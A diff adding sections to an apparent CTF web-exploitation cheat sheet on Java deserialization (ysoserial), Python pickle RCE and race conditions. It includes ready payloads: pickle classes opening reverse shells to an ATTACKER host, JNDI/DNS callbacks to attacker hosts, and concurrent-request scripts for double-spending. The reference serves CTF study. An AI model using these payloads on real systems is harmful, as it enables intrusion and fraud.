@@ -48,6 +48,9 @@
 - [WebSocket Mass Assignment](#websocket-mass-assignment)
 - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
 - [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)
+- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
+- [Python Pickle Deserialization](#python-pickle-deserialization)
+- [Race Conditions (TOCTOU)](#race-conditions-toctou)
 
 For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, WeasyPrint, MongoDB injection, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
@@ -623,3 +626,127 @@ ${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/fl
 ```
 
 **Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.
+
+---
+
+## Java Deserialization (ysoserial)
+
+**Pattern:** Java apps using `ObjectInputStream.readObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (base64-encoded, starts with `rO0AB` or hex `aced0005`).
+
+**Detection:**
+- Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
+- Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
+- Content-Type `application/x-java-serialized-object`
+- Burp extension: Java Deserialization Scanner
+
+**Key insight:** Deserialization triggers code in `readObject()` methods of classes on the classpath. If a "gadget chain" exists (sequence of classes whose `readObject` → method calls lead to arbitrary execution), the attacker gets RCE without needing to upload code.
+
+```bash
+# Generate payloads with ysoserial
+java -jar ysoserial.jar CommonsCollections1 'id' | base64
+java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser
+
+# Common gadget chains (try in order):
+# CommonsCollections1-7 (Apache Commons Collections)
+# CommonsBeanutils1 (Apache Commons BeanUtils)
+# URLDNS (no execution — DNS callback for blind detection)
+# JRMPClient (triggers JRMP connection)
+# Spring1/Spring2 (Spring Framework)
+
+# Blind detection via DNS callback (no RCE needed):
+java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
+
+# Send payload
+curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
+  --data-binary @payload.ser
+```
+
+**Bypass filters:**
+- If `ObjectInputStream` subclass blocklists specific classes, try alternative chains
+- `ysoserial-modified` and `GadgetProbe` enumerate available gadget classes
+- JNDI injection (Java Naming and Directory Interface): `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
+- For Java 17+ (module system restrictions): look for application-specific gadgets or Jackson/Fastjson deserialization instead
+
+---
+
+## Python Pickle Deserialization
+
+**Pattern:** Python apps deserializing untrusted data with `pickle.loads()`, `pickle.load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.
+
+**Detection:**
+- Base64 blobs containing `\x80\x04\x95` (pickle protocol 4) or `\x80\x05\x95` (protocol 5)
+- Source code: `pickle.loads()`, `pickle.load()`, `_pickle`, `shelve.open()`, `joblib.load()`, `torch.load()`
+- Flask sessions with `pickle` serializer (vs default `json`)
+
+**Key insight:** Python's `pickle.loads()` calls `__reduce__()` on deserialized objects, which can return `(os.system, ('command',))` — instant RCE. There is NO safe way to deserialize untrusted pickle data.
+
+```python
+import pickle, base64, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+
+# For reverse shell:
+class RevShell:
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
+
+# Using exec for multi-line payloads:
+class ExecRCE:
+    def __reduce__(self):
+        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
+```
+
+**Bypass restricted unpicklers:**
+- `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
+- If `builtins` allowed: `(__builtins__.__import__, ('os',))` then chain `.system()`
+- YAML deserialization (`yaml.load()` without `Loader=SafeLoader`) has similar RCE via `!!python/object/apply:os.system`
+- NumPy `.npy`/`.npz` files: `numpy.load(allow_pickle=True)` triggers pickle
+
+---
+
+## Race Conditions (TOCTOU)
+
+**Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.
+
+**Key insight:** Send identical requests simultaneously. The server reads the "before" state for all of them, then applies all changes — each request sees the pre-modification state.
+
+```python
+import asyncio, aiohttp
+
+async def race(url, data, headers, n=20):
+    """Send n identical requests simultaneously"""
+    async with aiohttp.ClientSession() as session:
+        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
+        responses = await asyncio.gather(*tasks)
+        for r in responses:
+            print(r.status, await r.text())
+
+asyncio.run(race('http://target/api/transfer',
+    {'to': 'attacker', 'amount': 1000},
+    {'Cookie': 'session=...'},
+    n=50))
+```
+
+**Common CTF race condition targets:**
+- **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
+- **Coupon/code reuse:** Single-use codes validated then marked used → redeem simultaneously before mark
+- **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
+- **File upload + use:** Upload file, server validates then moves → access file between upload and validation (or between validation and deletion)
+
+```bash
+# Turbo Intruder (Burp) — most reliable for precise timing
+# Or use curl with GNU parallel:
+seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
+  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
+```
+
+**Detection in source code:**
+- Non-atomic read-then-write patterns without locks/transactions
+- `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
+- File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
+- Redis `GET` then `SET` without `WATCH`/`MULTI`
